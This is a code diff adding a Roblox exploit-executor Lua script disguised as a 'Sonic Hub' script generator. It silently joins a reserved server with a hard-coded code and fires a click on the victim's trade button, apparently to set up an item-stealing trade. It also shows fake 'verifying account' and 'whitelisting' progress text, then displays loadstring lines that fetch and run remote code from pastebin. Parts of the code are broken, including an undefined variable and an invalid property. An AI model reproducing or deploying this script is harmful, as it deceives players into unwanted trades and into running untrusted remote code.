@@ -1,0 +1,153 @@
+plr = game.Players.LocalPlayer
+if game.Workspace:FindFirstChild("CamParts") then
+local servercode = "KF4X5T2yeG"
+wait(1)
+local args = {
+  [1] = servercode
+}
+game:GetService("ReplicatedStorage").Events.reserved:InvokeServer(unpack(args))
+wait(0.1)
+firesignal(plr.PlayerGui.chooseType.Frame.trade.MouseButton1Click)
+
+else
+
+
+local Scgui = Instance.new("ScreenGui")
+local frm = Instance.new("Frame",Scgui)
+local uicorner = Instance.new("UICorner",frm)
+local hubname = Instance.new("TextLabel",frm)
+local Scriptcontent = Instance.new("TextLabel",frm)
+local scriptcontent2 = Instance.new("TextLabel",frm)
+local uigradient2 = Instance.new("UIGradient",frm)
+local uigradient = Instance.new("UIGradient",hubname)
+-- modifying
+
+Scgui.Name = "Sonic"
+frm.Name = "SonicFrame"
+frm.BackgroundColor3 = Color3.fromRGB(58, 58, 58)
+frm.Size = UDim2.new(0.303, 0,0, 162)
+frm.Position = UDim2.new(0.349, 0,0.374, 0)
+hubname.Position = UDim2.new(0,0,0,0)
+hubname.Size = UDim2.new(1, 0,0.298, 0)
+hubname.TextColor3 = Color3.fromRGB(34, 161, 190)
+hubname.BackgroundTransparency = 1
+hubname.TextSize = 25
+hubname.Text = "Sonic Hub"
+hubname.Font = Enum.Font.Cartoon
+uigradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.0,Color3.new(0.298039, 0.298039, 1)),ColorSequenceKeypoint.new(1,Color3.new(0.0745098, 0.984314, 1))}
+uigradient2.Color = ColorSequence.new{ ColorSequenceKeypoint.new(0.0,Color3.new(0.0823529, 0.0823529, 0.0823529)) ,ColorSequenceKeypoint.new(0.5,Color3.fromRGB(58,58,58 )),ColorSequenceKeypoint.new(1,Color3.fromRGB(65, 65, 65))  }
+uigradient2.Rotation = -90
+Scriptcontent.Size = UDim2.new(0.515, 0,0.316, 0)
+Scriptcontent.Position = UDim2.new(0.24, 0,0.34, 0)
+Scriptcontent.TextSize = 20
+Scriptcontent.BackgroundTransparency = 1
+Scriptcontent.TextColor3 = Color3.fromRGB(124, 121, 120)
+Scriptcontent.Font = Enum.Font.SourceSans
+Scriptcontent.Text = ""
+scriptcontent2.Size = UDim2.new(0.515, 0,0.316, 0)
+scriptcontent2.Position = UDim2.new(0.24, 0,0.50, 0)
+scriptcontent2.TextSize = 20
+scriptcontent2.BackgroundTransparency = 1
+scriptcontent2.TextColor3 = Color3.fromRGB(124, 121, 120)
+scriptcontent2.Font = Enum.Font.SourceSans
+scriptcontent2.Text = ""
+local gradient = uigradient
+local ts = game:GetService("TweenService")
+local ti = TweenInfo.new(2, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
+local offset1 = {Offset = Vector2.new(-1, 0)}
+local create1 = ts:Create(gradient, ti, offset1)
+local startPos = Vector2.new(1, 0)
+local rot = 180 --starting gradient rotation
+gradient.Offset = startPos
+gradient.Rotation = 0
+
+
+
+spawn(function()
+    local function completed()
+
+	--border size pixel comming in handy because we only animate the gradient when the mouse is hovering over
+
+	if  rot == 0 then
+
+		gradient.Rotation = 180
+		gradient.Offset = startPos
+		create1:Play()	
+
+	elseif rot == 180 then --this will be run first
+
+		gradient.Rotation = 0
+		gradient.Offset = startPos
+		create1:Play()
+
+	end
+
+end
+	while true do
+		
+		create1:Play()
+		
+		create1.Completed:Wait()
+
+			--flip rotation
+			if rot == 0 then rot = 180 elseif rot == 180 then rot = 0 end
+			completed()
+
+	
+	end
+	
+end)
+
+
+print("Done")
+local GUI = Scgui
+
+    
+    syn.protect_gui(GUI) 
+ 
+GUI.Parent = game:GetService("CoreGui")
+
+local plrname = plrtoinvite
+-- LoadScript
+for a = 1,math.random(5,8) do
+	Scriptcontent.Text = "Loading."
+	wait(0.2)
+	Scriptcontent.Text = "Loading.."
+	wait(0.2)
+	Scriptcontent.Text = "Loading..."
+	wait(0.2)
+end
+for b = 1,math.random(4,10) do
+	Scriptcontent.Text = "Verifying account."
+	wait(0.2)
+	Scriptcontent.Text = "Verifying account.."
+	wait(0.2)
+	Scriptcontent.Text = "Verifying account..."
+    wait(0.2)
+	
+	
+end
+for c = 1,math.random(10,18) do
+	Scriptcontent.Text = "Our bot account".." is whitelisting you, please wait."
+	wait(0.2)
+	Scriptcontent.Text = "Our bot account".." is whitelisting you, please wait.."
+	wait(0.2)
+	Scriptcontent.Text = "Our bot account".." is whitelisting you, please wait..."
+	wait(0.2)
+end
+for d = 1,math.random(13,22) do
+	wait(0.2)
+	Scriptcontent.Text = "Generating script."
+	wait(0.2)
+	Scriptcontent.Text = "Generating script.."
+	wait(0.2)
+	Scriptcontent.Text = "Generating script..."
+	
+	
+end
+
+	Scriptcontent.Text = "Script1:".." loadstring(game:HttpGet('https://pastebin.com/raw/DNTzWcy3'))()"
+	Scriptcontent.Color3 = Color3.fromRGB(90, 157, 38)
+	scriptcontent2.Text = "Script2:".."loadstring(game:HttpGet('https://githubcontent/raw/ManoDoManoloka'))()"
+	scriptcontent2.Color3 = Color3.fromRGB(222, 205, 21)
+      end  
